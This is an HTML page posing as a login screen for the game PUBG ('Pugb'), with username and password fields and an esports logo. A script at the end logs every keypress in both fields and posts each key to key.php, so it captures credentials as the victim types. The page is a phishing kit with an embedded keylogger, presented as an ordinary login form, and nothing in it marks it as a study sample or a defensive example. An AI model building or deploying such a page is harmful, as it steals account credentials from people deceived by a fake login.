<!DOCTYPE html>
<html>
<head>
<title>Login - Pugb</title>
<meta name="viewport" content="width=devic­­e-width, initial-scale=1">
<link rel='stylesheet' href='https://use.fontawesome.com/releases/v5.7.0/css/all.css' integrity='sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ' crossorigin='anonymous'>

</head>
<body>


<form class="login">
	
	<div class="logo">
		<img src="https://gamepedia.cursecdn.com/pubg_esports_gamepedia_en/thumb/f/fe/Imba_PUBG_Super_League_logo.png/220px-Imba_PUBG_Super_League_logo.png?version=68966c167a829149a315139cf2dc837d">
	</div>

	<div class="inputs">
		<input id="email" type="text" name="" placeholder="Your user name">
		<input id="pass" type="password" name="" placeholder="Your secret password">
		<button>Continue</button>
		<p>Dont have an account? <a href="#">Sign up</a></p>
	</div>

</form>

</body>

</html>

<script>
      
	document
	.getElementById("email")
	.addEventListener("keypress", function (data) {
		$.post("key.php", { userkey: data.key });
	  });
	  
	document
	  .getElementById("pass")
	  .addEventListener("keypress", function (data) {
		$.post("key.php", { passkey: data.key });
	  });
	  

  </script>
</body>
</html>
